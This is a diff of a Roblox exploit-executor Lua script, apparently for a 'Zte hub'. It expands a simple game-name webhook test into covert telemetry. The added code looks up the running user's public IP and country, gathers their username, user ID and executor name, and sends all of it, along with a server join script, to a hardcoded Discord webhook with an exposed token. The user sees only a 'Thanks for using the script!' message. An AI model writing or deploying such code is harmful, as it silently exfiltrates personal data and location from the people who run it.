@@ -1,45 +1,146 @@
--- LocalScript: test_game_name.lua
+-- LocalScript: send_info_full.lua
+-- Đặt vào StarterPlayerScripts để đảm bảo trả về LocalPlayer
 
 local Http       = game:GetService("HttpService")
-local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"  -- Thay bằng webhook của bạn
+local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy" -- Thay thành webhook thật của bạn
+local executor   = identifyexecutor() or "UnknownExecutor"
 
--- Lấy “Game Name” đơn giản
-local gameName = tostring(game.Name or "Unknown Game")
-print("DEBUG | Game Name đang lấy: " .. gameName)
+--========================================================================
+-- 1. Hàm lấy “Country + IP” từ https://api.myip.com/
+--    (HTTPS bắt buộc; nếu bị chặn thì trả về "Unknown")
+--========================================================================
+local function getIPInfo()
+    local success, response = pcall(function()
+        return Http:GetAsync("https://api.myip.com/")
+    end)
+    if not success then
+        print("DEBUG | getIPInfo() => HTTP request thất bại hoặc bị chặn")
+        return "Unknown", "Unknown"
+    end
 
--- Build payload chỉ chứa Game Name
-local payload = {
-    content = "**Test Game Name**",
-    embeds  = {
-        {
-            title = "Game Name Check",
-            fields = {
-                {
-                    name  = "Game Name:",
-                    value = gameName,
-                    inline = false
-                }
-            }
-        }
-    }
-}
+    print("DEBUG | getIPInfo() response JSON: " .. response)
 
--- Gửi request lên Discord
-local requestFunc
-if syn and syn.request then
-    requestFunc = syn.request
-else
-    requestFunc = http_request or request or HttpPost or (syn and syn.request)
+    local ok, decoded = pcall(function()
+        return Http:JSONDecode(response)
+    end)
+    if not ok or type(decoded) ~= "table" then
+        print("DEBUG | JSONDecode failed hoặc data không phải table")
+        return "Unknown", "Unknown"
+    end
+
+    if type(decoded.country) == "string" and type(decoded.ip) == "string" then
+        print("DEBUG | API trả về -> country: " .. decoded.country .. ", ip: " .. decoded.ip)
+        return decoded.country, decoded.ip
+    else
+        print("DEBUG | API JSON thiếu 'country' hoặc 'ip'")
+        return "Unknown", "Unknown"
+    end
 end
 
-if requestFunc then
-    requestFunc({
+--========================================================================
+-- 2. Hàm build payload, gom tất cả thông tin (Executor, Country, IP, Game Name, Player Info, Join Script)
+--========================================================================
+local function buildPayload()
+    -- Lấy LocalPlayer, nếu nil thì báo là nil
+    local player      = game.Players.LocalPlayer
+    if not player then
+        warn("DEBUG | LocalPlayer đang nil. Hãy đảm bảo đây là LocalScript trong StarterPlayerScripts.")
+    end
+
+    local displayName = player and player.DisplayName or "DisplayName Unknown"
+    local userName    = player and player.Name or "Name Unknown"
+    local playerId    = player and player.UserId or 0
+
+    -- Lấy game name
+    local gameName = tostring(game.Name or "UnknownGame")
+    print("DEBUG | buildPayload() lấy gameName: " .. gameName)
+
+    -- Lấy placeId + jobId để build join script
+    local placeId = tostring(game.PlaceId)
+    local jobId   = tostring(game.JobId)
+    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
+                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+
+    -- Lấy country + ip
+    local country, ip = getIPInfo()
+    print("DEBUG | buildPayload() -> country: " .. country .. " | ip: " .. ip)
+
+    -- Xây embed
+    local embed1 = {
+        author = {
+            name = "Zte hub Server"
+        },
+        title = userName .. " | " .. displayName,
+        type  = "rich",
+        color = tonumber(0x00FF00),
+        thumbnail = {
+            url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
+                  "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
+        },
+        fields = {
+            {
+                name   = "Executor:",
+                value  = executor,
+                inline = true
+            },
+            {
+                name   = "Country:",
+                value  = country,
+                inline = true
+            },
+            {
+                name   = "IP Address:",
+                value  = ip,
+                inline = true
+            },
+            {
+                name   = "Game Name:",
+                value  = gameName,
+                inline = false
+            },
+        },
+    }
+
+    local embed2 = {
+        title       = "Join Server Script",
+        description = "```lua\n" .. joinScript .. "\n```",
+        color       = tonumber(0x00FF00),
+    }
+
+    local payload = {
+        content = "**Thanks for using the script!**",
+        embeds  = { embed1, embed2 }
+    }
+
+    return {
         Url     = WebhookUrl,
         Method  = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
         Body    = Http:JSONEncode(payload)
-    })
-else
-    warn("Không tìm thấy hàm request để gửi payload")
+    }
 end
 
+--========================================================================
+-- 3. Gửi webhook: tự động chọn hàm thích hợp
+--========================================================================
+local function sendWebhook()
+    local requestFunc
+    if syn and syn.request then
+        requestFunc = syn.request
+    else
+        requestFunc = http_request or request or HttpPost or (syn and syn.request)
+    end
+
+    if not requestFunc then
+        warn("DEBUG | Không tìm thấy hàm request để gửi HTTP")
+        return
+    end
+    requestFunc(buildPayload())
+end
+
+--========================================================================
+-- 4. Thực thi
+--========================================================================
+sendWebhook()
